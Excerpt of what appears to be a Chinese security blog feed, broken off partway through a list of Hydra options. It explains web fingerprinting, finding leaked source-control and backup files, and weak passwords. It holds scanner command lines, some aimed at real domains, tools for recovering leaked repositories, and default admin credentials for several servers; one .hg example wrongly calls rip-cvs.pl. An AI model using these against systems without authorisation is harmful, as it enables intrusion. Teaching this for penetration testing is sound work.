<h5 id="w11scan分布式WEB指纹识别平台"><a href="#w11scan分布式WEB指纹识别平台" class="headerlink" title="w11scan分布式WEB指纹识别平台"></a>w11scan分布式WEB指纹识别平台</h5><p>w11scan是一款分布式的WEB指纹识别系统（包括CMS识别、js框架、组件容器、代码语言、WAF等等），管理员可以在WEB端新增/修改指纹，建立批量的扫描任务，并且支持多种搜索语法。</p>
<p>安装和下载可参考：<a href="https://github.com/w-digital-scanner/w11scan">https://github.com/w-digital-scanner/w11scan</a></p>
<p>手工安装稍微复杂，不过作者提供了docker部署，方便很多，使用了Mongodb，内置了1800多条常见的指纹，可以识别多达538种常见CMS，当然也可以手工添加指纹。</p>
<h5 id="TideFinger"><a href="#TideFinger" class="headerlink" title="TideFinger"></a>TideFinger</h5><p>TideSec团队开发的一个开源的指纹识别工具，使用了传统和现代检测技术相结合的指纹检测方法，让指纹检测更快捷、准确。</p>
<p>下载地址：<a href="https://github.com/TideSec/TideFinger\\\n\\\n在对指纹库整理去重后，对每个指纹进行了命中率的标识，当匹配到某个指纹时该指纹命中率会加1，而在使用指纹时会从优先使用命中率高的指纹。">https://github.com/TideSec/TideFinger\\\n\\\n在对指纹库整理去重后，对每个指纹进行了命中率的标识，当匹配到某个指纹时该指纹命中率会加1，而在使用指纹时会从优先使用命中率高的指纹。</a></p>
<h5 id="Dayu指纹识别工具"><a href="#Dayu指纹识别工具" class="headerlink" title="Dayu指纹识别工具"></a>Dayu指纹识别工具</h5><p>“大禹”为一款c/s结构jar文件工具，只需本地安装java环境，加参数-u即可，具体设置参数可参考github介绍。</p>
<p>下载地址：<a href="https://github.com/Ms0x0/Dayu">https://github.com/Ms0x0/Dayu</a></p>
<h4 id="在线指纹识别"><a href="#在线指纹识别" class="headerlink" title="在线指纹识别"></a>在线指纹识别</h4><h5 id="云悉指纹识别"><a href="#云悉指纹识别" class="headerlink" title="云悉指纹识别"></a>云悉指纹识别</h5><p><a href="http://www.yunsee.cn/">http://www.yunsee.cn/</a></p>
<h5 id="bugscaner指纹识别"><a href="#bugscaner指纹识别" class="headerlink" title="bugscaner指纹识别"></a>bugscaner指纹识别</h5><p><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
<h5 id="潮汐在线指纹识别"><a href="#潮汐在线指纹识别" class="headerlink" title="潮汐在线指纹识别"></a>潮汐在线指纹识别</h5><p><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>资产收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>敏感文件目录探测</title>
    <url>/post/500fa748.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="目录扫描的介绍"><a href="#目录扫描的介绍" class="headerlink" title="目录扫描的介绍"></a>目录扫描的介绍</h2><p>目录扫描可以让我们发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构。通过目录扫描我们还能扫描敏感文件，后台文件，数据库文件，和信息泄漏文件等等</p>
<p>目录扫描有两种方式：</p>
<ul>
<li><p>使用目录字典进行暴力才接存在该目录或文件返回200或者403；</p>
</li>
<li><p>使用爬虫爬行主页上的所有链接，对每个链接进行再次爬行，收集这个域名下的所有链接，然后总结出需要的信息。</p>
</li>
</ul>
<h2 id="常见敏感文件或目录"><a href="#常见敏感文件或目录" class="headerlink" title="常见敏感文件或目录"></a>常见敏感文件或目录</h2><p>通常我们所说的敏感文件、敏感目录大概有以下几种：</p>
<ul>
<li>robots.txt</li>
<li>crossdomain.xml</li>
<li>sitemap.xml</li>
<li>后台目录</li>
<li>网站安装目录</li>
<li>网站上传目录</li>
<li>mysql管理页面</li>
<li>phpinfo</li>
<li>网站文本编辑器</li>
<li>测试文件</li>
<li>网站备份文件（.rar、.zip、.7z、.tar、.gz、.bak）</li>
<li>DS_Store文件</li>
<li>vim编辑器备份文件（.swp）</li>
<li>WEB-INF/web.xml文件</li>
</ul>
<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><h4 id="robots-txt是什么？"><a href="#robots-txt是什么？" class="headerlink" title="robots.txt是什么？"></a>robots.txt是什么？</h4><p>robots.txt是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被搜索引擎访问的部分，或者指定搜索引擎只收录指定的内容。当一个搜索引擎（又称搜索机器人或蜘蛛程序）访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，那么搜索机器人就沿着链接抓取。</p>
<h4 id="robots-txt的作用？"><a href="#robots-txt的作用？" class="headerlink" title="robots.txt的作用？"></a>robots.txt的作用？</h4><ul>
<li>引导搜索引擎蜘蛛抓取指定栏目或内容</li>
<li>网站改版或者URL重写优化时候屏蔽对搜索引擎的不友好的链接</li>
<li>屏蔽死链接、404错误页</li>
<li>屏蔽无内容、无价值页面</li>
<li>屏蔽重复页面，如评论页、搜索结果页</li>
<li>引导蜘蛛抓取网站地图</li>
</ul>
<h4 id="robots-txt的语法？"><a href="#robots-txt的语法？" class="headerlink" title="robots.txt的语法？"></a>robots.txt的语法？</h4><ul>
<li><p>User-agent: （定义搜索引擎）</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line">User-agent: *			（定义所有搜索引擎）</span><br><span class="line">User-agent: Googlebot		（定义谷歌，只允许谷歌蜘蛛爬行）</span><br><span class="line">User-agent: Baiduspider		（定义百度，只允许百度蜘蛛爬行）</span><br><span class="line"></span><br><span class="line">不同的搜索引擎的搜索机器人有不同的名称，谷歌:Googlebot、百度:Baiduspider、MSN:MSNbot、Yahoo:Slurp。</span><br></pre></td></tr></table></figure>
</li>
<li><p>Disallow: （用来定义禁止蜘蛛爬行的页面或目录）</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line">Disallow: /		（禁止蜘蛛爬行网站的所有目录&quot;/&quot;表示根目录下）</span><br><span class="line">Disallow:/admin		（禁止蜘蛛爬取/admin目录）</span><br><span class="line">Disallow: /abc.html	（禁止蜘蛛爬去abc.html页面）</span><br><span class="line">Disallow: /help.html 	（禁止蜘蛛爬去help.html页面）</span><br></pre></td></tr></table></figure>
</li>
<li><p>Allow：（用来定义允许蜘蛛爬取的页面或子目录）</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line">Allow: /admin/test/	（允许蜘蛛爬取admin下的test目录）</span><br><span class="line">Allow: /admin/abc.html	（允许蜘蛛爬去admin目录中的abc.html页面）</span><br></pre></td></tr></table></figure>
<p>  <img src="https://img2020.cnblogs.com/blog/2224145/202103/2224145-20210303154852471-1588407548.png" alt="img"></p>
</li>
</ul>
<h3 id="crossdomain-xml"><a href="#crossdomain-xml" class="headerlink" title="crossdomain.xml"></a>crossdomain.xml</h3><p>跨域，顾名思义就是需要的资源不在自己的域服务器上，需要访问其他域服务器。跨域策略文件是一个xml文档文件，主要是为web客户端(如Adobe Flash Player等)设置跨域处理数据的权限。打个比方说，公司A部门有一台公共的电脑，里面存放着一些资料文件，专门供A部门内成员自己使用，这样，A部门内的员工就可以访问该电脑，其他部门人员则不允许访问。如下图：</p>
<blockquote>
<p><img src="https://i.loli.net/2021/10/05/jDug5eKLME2NRm9.png" alt="img"></p>
<p>A部门的员工可以任意访问A部门的公共电脑，但是不能直接访问B部门的公共电脑。有一天，B部门领导觉得他们的资料非常有用，想要与A部门分享，于是就给A部门一个令牌，这样A部门的员工也可以访问B部门的公共电脑了。A部门可访问B部门设置访问权限，这个权限设置就是跨域策略文件crossdomain.xml存在的意义。</p>
</blockquote>
<p>crossdomin.xml 示例文件如下，重点查看<code>allow-access-from</code>字段获取网站目录信息</p>
<p><img src="https://img2020.cnblogs.com/blog/2224145/202103/2224145-20210303154534325-1014027553.png" alt="img"></p>
<h3 id="sitemap-xml"><a href="#sitemap-xml" class="headerlink" title="sitemap.xml"></a>sitemap.xml</h3><p>Sitemap 可方便网站管理员通知搜索引擎他们网站上有哪些可供抓取的网页。最简单的 Sitemap 形式，就是XML 文件，在其中列出网站中的网址以及关于每个网址的其他元数据（上次更新的时间、更改的频率以及相对于网站上其他网址的重要程度为何等），以便搜索引擎可以更加智能地抓取网站。</p>
<p><img src="https://i.loli.net/2021/10/05/WoIy7uw3BRNlCP4.png" alt="img"></p>
<h3 id="源代码泄露"><a href="#源代码泄露" class="headerlink" title="源代码泄露"></a>源代码泄露</h3><h4 id="git源代码泄露"><a href="#git源代码泄露" class="headerlink" title=".git源代码泄露"></a>.git源代码泄露</h4><p>Git是一个开源的分布式版本控制系统，在执行git init初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码变更记录等。发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p>
<p>利用工具：GitHack</p>
<p>项目地址：<a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p>
<p>扫描目录：</p>
<p><img src="https://i.loli.net/2021/10/05/gd74TSv6aIxEpmb.png" alt="img"></p>
<p>使用GitHack工具成功恢复代码</p>
<p><img src="https://i.loli.net/2021/10/05/uBzLftVJkQ2nwZr.png" alt="img"></p>
<h4 id="cvs源代码泄露"><a href="#cvs源代码泄露" class="headerlink" title=".cvs源代码泄露"></a>.cvs源代码泄露</h4><p>CSV是一个C/S系统，多个开发人员通过中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息。</p>
<p>返回根信息：<code>http://www.example.com/CVS/Root</code></p>
<p>返回所有文件的结构：<code>http://www.example.com/CVS/Entries</code></p>
<p>漏洞利用工具：dvcs-ripper</p>
<p>项目地址：<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rip-cvs.pl -v -u http://www.example.com/CVS</span><br></pre></td></tr></table></figure>
<h4 id="svn源代码泄露"><a href="#svn源代码泄露" class="headerlink" title=".svn源代码泄露"></a>.svn源代码泄露</h4><p>SVN是一个开放源代码的版本控制系统。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要地方源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露在外网环境，可以使用.svn/entries文件，获取到服务器源码。</p>
<p>漏洞利用工具：</p>
<p>Seay SVN漏洞利用工具</p>
<p><img src="https://i.loli.net/2021/10/05/4AOYiPwVRNh7DXK.png" alt="img"></p>
<p>SvnExploit</p>
<p>项目地址：<a href="https://github.com/admintony/svnExploit/">https://github.com/admintony/svnExploit/</a></p>
<p>扫描站点存在/.svn/entries目录</p>
<p><img src="https://i.loli.net/2021/10/05/9SQeYdZz1yFkTU6.png" alt="img"></p>
<p>成功恢复代码</p>
<p><img src="https://i.loli.net/2021/10/05/nIVpGW3CxfX9Z6t.png" alt="img"></p>
<h4 id="hg源代码泄露"><a href="#hg源代码泄露" class="headerlink" title=".hg源代码泄露"></a>.hg源代码泄露</h4><p>Mercurial是一种轻量级分布式版本控制系统，使用hg init的时候会生成.hg。</p>
<p>漏洞利用工具：dvcs-ripper</p>
<p>项目地址：<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rip-cvs.pl -v -u http://www.example.com/.hg/</span><br></pre></td></tr></table></figure>
<h3 id="DS-store文件泄露"><a href="#DS-store文件泄露" class="headerlink" title=".DS_store文件泄露"></a>.DS_store文件泄露</h3><p>.DS_store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_store上传部署到服务器，可能造成文件目录结构泄露，特别是备份文件、源代码文件。</p>
<p>漏洞利用工具：ds_store_exp</p>
<p>项目地址：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ds_store_exp.py http://xxx.com/.DS_Store</span><br></pre></td></tr></table></figure>
<h3 id="网站备份文件泄露"><a href="#网站备份文件泄露" class="headerlink" title="网站备份文件泄露"></a>网站备份文件泄露</h3><p>管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。 常见的备份文件后缀：<code>.rar</code>、<code>.zip</code>、<code>.7z</code>、<code>.tar.gz</code>、<code>.bak</code>、<code>.txt</code>、<code>.old</code>、<code>.temp</code></p>
<h3 id="SWP文件泄露"><a href="#SWP文件泄露" class="headerlink" title="SWP文件泄露"></a>SWP文件泄露</h3><p>swp即swap文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为.filename.swp。</p>
<h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p>WEB-INF是Java的Web应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF主要包含以下文件或目录：</p>
<ul>
<li>WEB-INF/web.xml：Web应用程序配置文件，描述了servlet和其他的应用组件及命名规则</li>
<li>WEB-INF/database.properties：数据库配置文件</li>
<li>WEB-INF/classes/：一般用来存放Java类文件（.class）</li>
<li>WEB-INF/lib/：用来存放打包好的库（.jar）</li>
<li>WEB-INF/src/：用来存放源代码</li>
</ul>
<p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接下载 class 文件，再通过反编译 class 文件，得到网站源码。</p>
<h2 id="敏感目录收集方式"><a href="#敏感目录收集方式" class="headerlink" title="敏感目录收集方式"></a>敏感目录收集方式</h2><h3 id="网页中寻找"><a href="#网页中寻找" class="headerlink" title="网页中寻找"></a>网页中寻找</h3><ul>
<li>在robots.txt中看能否发现敏感目录</li>
<li>F12源代码链接处</li>
<li>通过查看一些图片的属性路径，运气好会发现很多隐藏的目录 结合域名+目录，用御剑进行扫描，当然也可以手动输入一些常见的后台管理地址进行访问。</li>
</ul>
<h3 id="其他端口中寻找"><a href="#其他端口中寻找" class="headerlink" title="其他端口中寻找"></a>其他端口中寻找</h3><p>有时候网站的不同端口中有一些便是专门的后台管理地址。根据经验总结，很多网站8080、8081端口是网站的管理地址。</p>
<p>例如：<code>http://www.xxx.com:8080</code></p>
<h3 id="网站分目录下寻找"><a href="#网站分目录下寻找" class="headerlink" title="网站分目录下寻找"></a>网站分目录下寻找</h3><p>有的时候网站会把管理地址放在一个分目录下，有的时候一个网站比较大，后台管理页面也比较多，就要分目录的去找，</p>
<p>例如：<code>http://www.xxx.com/test/admin/manage.php</code></p>
<p>你可以通过一些方式获取到网站的目录，然后在这个目录下进行扫描。当一个网站你扫描根目录没有任何收获时，这个时候通过分析网站的目录结构，然后扫描域名+目录，就能找出它的后台管理地址。</p>
<h3 id="子域名下寻找"><a href="#子域名下寻找" class="headerlink" title="子域名下寻找"></a>子域名下寻找</h3><p>有的时候网站的管理地址会放在子域名下，所以主站什么都找不到的情况下，如果发现子域名，就通过这些方法去子域名下找一下吧。</p>
<p>例如：<code>http://admin.xxx.com/login</code></p>
<h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><p>Google Hacking 一般是做为黑客在入侵时的一个手段.在入侵过程中有时需要查找后台的登陆口就需要用到Google Hacking。有时猜解密码的时候谷歌也是提供查找管理员资料的有效平台。是一种社会工程学获取目标信息的手段。可以用于跟踪某对象在网络上的各种踪迹（如交友平台、微博等）。</p>
<p>有关谷歌语法的介绍可参考第一章的第一节：<a href="../undefined">1.开源情报与搜索引擎</a></p>
<h3 id="网站爬虫"><a href="#网站爬虫" class="headerlink" title="网站爬虫"></a>网站爬虫</h3><p>通过awvs，burpsuite的爬行功能，可以拓扑出网站的目录结构，有的时候运气好能在网页的目录结构中找到好东西，不过爬行一般会结合工具扫描，比如你构造域名+目录，然后扫描这个。</p>
<p>burp spider爬行</p>
<p><img src="https://i.loli.net/2021/10/05/tOydZi3zbE1SkhP.png" alt="img"></p>
<h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h3><h4 id="御剑后台扫描工具"><a href="#御剑后台扫描工具" class="headerlink" title="御剑后台扫描工具"></a>御剑后台扫描工具</h4><p>御剑是一款针对网站目录及后台管理地址进行扫描的工具。该工具的开发思路其实是非常简单的，而工具里目录或者后台管理地址等的扫描用例才是一个黑客多年经验的结晶。<img src="https://i.loli.net/2021/10/05/BLz8JpVHl4TZxbj.png" alt="img"></p>
<h4 id="DirBuster"><a href="#DirBuster" class="headerlink" title="DirBuster"></a>DirBuster</h4><p>DirBuster是OWASP（Open Web Application Security Project）开发的一款专门用于探测Web服务器目录及隐藏文件的，功能十分强大的工具。DirBuster最擅长目录的暴力猜解，因此，DirBuster一般都会发现一些目录浏览、目录遍历及目录穿越等漏洞，甚至还会发现一些后台管理地址等。</p>
<p><img src="https://i.loli.net/2021/10/05/LXGmHOM45t3Wsx8.png" alt="3b2fca51126d0f343b1cb86a1085d9a9.png"></p>
<h4 id="wwwscan"><a href="#wwwscan" class="headerlink" title="wwwscan"></a>wwwscan</h4><p>wwwscan是一款网站后台扫描工具，简单好用又强大。它有命令行和图形界面两种。</p>
<p><img src="https://i.loli.net/2021/10/05/nY3vAF5JiEqBMem.png" alt="e22f74eaee18b731c5453b0e79f8e294.png"></p>
<h4 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h4><p>Kali Linux内置工具</p>
<p>dirb是一个基于字典的web目录扫描工具,会用递归的方式来获取更多的目录,它还支持代理和http认证限制访问的网站。</p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://www.baidu.com</span><br></pre></td></tr></table></figure>
<h4 id="dirmap"><a href="#dirmap" class="headerlink" title="dirmap"></a>dirmap</h4><p>一个高级web目录扫描工具，功能将会强于DirBuster、Dirsearch、cansina、御剑</p>
<p>项目地址：<a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirmap.py -i https://target.com -lcf</span><br></pre></td></tr></table></figure>
<h4 id="Cansina"><a href="#Cansina" class="headerlink" title="Cansina"></a>Cansina</h4><p>Cansina是用python写的一款探测网站的敏感目录和内容的安全测试工具</p>
<p>项目地址：<a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a></p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 cansina.py -u http://baidu.com</span><br></pre></td></tr></table></figure>
<h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><p>dirsearch是一个python开发的目录扫描工具,目的是扫描网站的敏感文件和目录从而找到突破口。</p>
<p>项目地址：<a href="https://github.com/maurosoria/dirsearch/">https://github.com/maurosoria/dirsearch/</a></p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://www.baidu.com -e php,js --exclude-status 403,401</span><br></pre></td></tr></table></figure>
<h4 id="weakfilescan"><a href="#weakfilescan" class="headerlink" title="weakfilescan"></a>weakfilescan</h4><p>基于爬虫，动态收集扫描目标相关信息后进行二次整理形成字典规则，利用动态规则的多线程敏感信息泄露检测工具。</p>
<p>项目地址：<a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a></p>
<p>运行示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python wyspider.py http://wuyun.org php</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>针对网络协议的暴力破解</title>
    <url>/post/b675a117.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="弱口令与字典"><a href="#弱口令与字典" class="headerlink" title="弱口令与字典"></a>弱口令与字典</h2><h3 id="弱口令的定义"><a href="#弱口令的定义" class="headerlink" title="弱口令的定义"></a>弱口令的定义</h3><p>弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。弱口令指的是仅包含简单数字和字母的口令，例如“123”、“abc”等，因为这样的口令很容易被别人破解，从而使用户的互联网账号受到他人控制，因此不推荐用户使用。</p>
<h3 id="弱口令产生原因"><a href="#弱口令产生原因" class="headerlink" title="弱口令产生原因"></a>弱口令产生原因</h3><p>这个应该是与个人习惯相关与意识相关，为了避免忘记密码，使用一个非常容易记住的密码，或者是直接采用系统的默认密码等。相关的安全意识不够，总认为不会有人会猜到我这个弱口令的，相关的安全意识不够，总认为不会有人会猜到我这个弱口令的。</p>
<h3 id="弱口令的危害"><a href="#弱口令的危害" class="headerlink" title="弱口令的危害"></a>弱口令的危害</h3><p>通过系统弱口令，可被黑客直接获得系统控制权限。</p>
<h3 id="弱口令解决办法"><a href="#弱口令解决办法" class="headerlink" title="弱口令解决办法"></a>弱口令解决办法</h3><p>强制对所有的管理系统账号密码强度必须达到一定的级别。不可在使用简单的admin、123456等弱密码了，修改密码为复杂密码并加密保存，建议密码包含大小写字母，数据和特殊符号，密码长度不低于八位，如果网站存在数据泄漏漏洞（如sql注入漏洞），务必修复漏洞。。</p>
<p>设置密码通常遵循以下原则：</p>
<p>（1）不使用空口令或系统缺省的口令，这些口令众所周之，为典型的弱口令。</p>
<p>（2）口令长度不小于8 个字符。</p>
<p>（3）口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）。</p>
<p>（4）口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符。</p>
<p>（5）口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail 地址等等与本人有关的信息，以及字典中的单词。</p>
<p>（6）口令不应该为用数字或符号代替某些字母的单词。</p>
<p>（7）口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入。</p>
<p>（8）至少90 天内更换一次口令，防止未被发现的入侵者继续使用该口令。</p>
<h3 id="弱口令分类"><a href="#弱口令分类" class="headerlink" title="弱口令分类"></a>弱口令分类</h3><h4 id="公共弱口令"><a href="#公共弱口令" class="headerlink" title="公共弱口令"></a>公共弱口令</h4><p>公共弱口令就是常见的密码，公共弱口令也就是根据大量的密码数据统计得出的出现频率较高弱口令，关于这方面的弱口令统计结果有很多。</p>
<p>下列举例了10个全球最常用的弱口令（由安全公司NordPass公布）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123456</span><br><span class="line">123456789</span><br><span class="line">picture1</span><br><span class="line">password</span><br><span class="line">12345678</span><br><span class="line">111111</span><br><span class="line">123123</span><br><span class="line">12345</span><br><span class="line">1234567890</span><br><span class="line">senha</span><br></pre></td></tr></table></figure>
<p>其中，位居其三的picture1和位居其十的senha（在葡萄牙语中是密码的意思）均是2020年新上榜的密码。</p>
<p>完整榜单：<a href="https://nordpass.com/most-common-passwords-list/">https://nordpass.com/most-common-passwords-list/</a></p>
<p>对于网站后台而言，一般为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">manager</span><br><span class="line">admin123</span><br><span class="line">admin888</span><br><span class="line">admin666</span><br></pre></td></tr></table></figure>
<p>具体来说，不同的后台类型拥有不同的弱密码：</p>
<ul>
<li><p>数据库（phpmyadmin）：账号：root，密码：root、root123、123456</p>
</li>
<li><p>tomcat：账号：admin、tomcat、manager，密码：admin、tomcat、admin123、123456、manager</p>
</li>
<li><p>jboss：账号：admin、jboss、manager，密码：admin、jboss、manager、123456</p>
</li>
<li><p>weblogic：账号：weblogic、admin、manager，密码：weblogic、admin、manager、123456</p>
</li>
</ul>
<h4 id="条件弱口令"><a href="#条件弱口令" class="headerlink" title="条件弱口令"></a>条件弱口令</h4><p>个人弱口令往往与这个人的个人信息（姓名，生日，手机号，特殊昵称，爱好，社交软件账号，常用username,邮箱…），关系成员（家庭成员，男女朋友…），所处环境（车牌号，公司信息比如公司名称，公司成立时间或地点，公司domain等…），还有特殊的指定字符（数字，单词…），在这里我也列举一些经常出现的组合：我们可以使用一些工具来生成弱口令字典。</p>
<h3 id="弱口令字典生成工具"><a href="#弱口令字典生成工具" class="headerlink" title="弱口令字典生成工具"></a>弱口令字典生成工具</h3><h4 id="Pydictor"><a href="#Pydictor" class="headerlink" title="Pydictor"></a>Pydictor</h4><p>pydictor 是一款轻量级字典生成工具，使用 python 语言开发，遵循 GPLv3 协议的开源命令行工具，主要用来帮助安全研究人员生成称心如意的暴力破解字典。</p>
<p>以功能强大、简洁实用、适用场景多、自定义程度强为开发目标。</p>
<p>项目地址：<a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a></p>
<h4 id="cupper"><a href="#cupper" class="headerlink" title="cupper"></a>cupper</h4><p>基于国外的一款社工字典生成工具（cupp）进行改进。因为cupp多年不更新而且密码生成习惯和汉语还是有很大差异的，在渗透测试环节存在许多问题。因此最初为了be better than cupp，社工密码生成器命名为cupper。但是现在这款工具的目标不仅仅是be better than cupp，而是力求达到国内最好的社工密码猜解效果。</p>
<p>项目地址：<a href="https://github.com/Saferman/cupper">https://github.com/Saferman/cupper</a></p>
<h4 id="PassGAN"><a href="#PassGAN" class="headerlink" title="PassGAN"></a>PassGAN</h4><p>基于深度学习，来训练PassGAN模型来生成密码。是第一个利用生成对抗网络（GANs）来增强密码破译的新方法。</p>
<p>（虽然我也没用过，感觉很NB的样子）</p>
<p>项目地址：<a href="https://github.com/brannondorsey/PassGAN">https://github.com/brannondorsey/PassGAN</a></p>
<h4 id="Crunch"><a href="#Crunch" class="headerlink" title="Crunch"></a>Crunch</h4><p>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。使用Crunch工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。由其在渗透测试需要爆破的时候，字典的编排等直接影响到我们的爆破速度，对整个渗透测试流程起着十分重要的作用。</p>
<p>Crunch为kali自带工具之一。</p>
<p>使用教程：<a href="https://www.freebuf.com/sectool/170817.html">https://www.freebuf.com/sectool/170817.html</a></p>
<h3 id="Kali-Linux自带的字典"><a href="#Kali-Linux自带的字典" class="headerlink" title="Kali Linux自带的字典"></a>Kali Linux自带的字典</h3><p>Kali默认自带了一些字典，在 /usr/share/wordlists 目录下</p>
<p><img src="https://i.loli.net/2021/10/05/DwTF1z3xgV6PU9X.png" alt="a628e9d255698b11b1e78e7ec24e0979.png"></p>
<h2 id="暴力破解网络协议工具"><a href="#暴力破解网络协议工具" class="headerlink" title="暴力破解网络协议工具"></a>暴力破解网络协议工具</h2><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具。Hydra是一个验证性质的工具，主要目的是：展示安全研究人员从远程获取一个系统认证权限。</p>
<p>目前该工具支持以下协议的爆破： AFP，Cisco AAA，Cisco身份验证，Cisco启用，CVS，Firebird，FTP，HTTP-FORM-GET，HTTP-FORM-POST，HTTP-GET，HTTP-HEAD，HTTP-PROXY，HTTPS-FORM- GET，HTTPS-FORM-POST，HTTPS-GET，HTTPS-HEAD，HTTP-Proxy，ICQ，IMAP，IRC，LDAP，MS-SQL，MYSQL，NCP，NNTP，Oracle Listener，Oracle SID，Oracle，PC-Anywhere， PCNFS，POP3，POSTGRES，RDP，Rexec，Rlogin，Rsh，SAP / R3，SIP，SMB，SMTP，SMTP枚举，SNMP，SOCKS5，SSH（v1和v2），Subversion，Teamspeak（TS2），Telnet，VMware-Auth ，VNC和XMPP。</p>
<p>对于 HTTP，POP3，IMAP和SMTP，支持几种登录机制，如普通和MD5摘要等。</p>
<p>由于Kali中自带Hydra，所以怎么安装就不讲了，下面直接讲如何用它。</p>
<h4 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h4><ul>
<li>-R：继续从上一次进度接着破解</li>
<li>-S：大写，采用SSL链接</li>
<li>-s &lt;PORT&gt;：小写，可通过这个参数指定非默认端口</li>
<li>-l &lt;LOGIN&gt;：指定破解的用户，对特定用户破解</li>
<li>-L &lt;FILE&gt;：指定用户名字典</li>
<li>-p &lt;PASS&gt;：小写，指定密码破解，少用，一般是采用密码字典</li>
<li>-P &lt;FILE&gt;：大写，指定密码字典</li>
<li>-e &lt;ns&gt;：可选选项，n：空密码试探，s：使用指定用户和密码试探</li>
<li>-C &lt;FILE&gt;：使用冒号分割格式，例如“登录名:密码”来代替 -L/-P 参数</li>
<li>-M &lt;FILE&gt;：指定目标列表文件一行一条</li>
<li>-o &lt;FILE&gt;：指定结果输出文件</li>
<li>-f ：在使用-M参数以后，找到第一对登录名或者密码的时候中止破解</li>
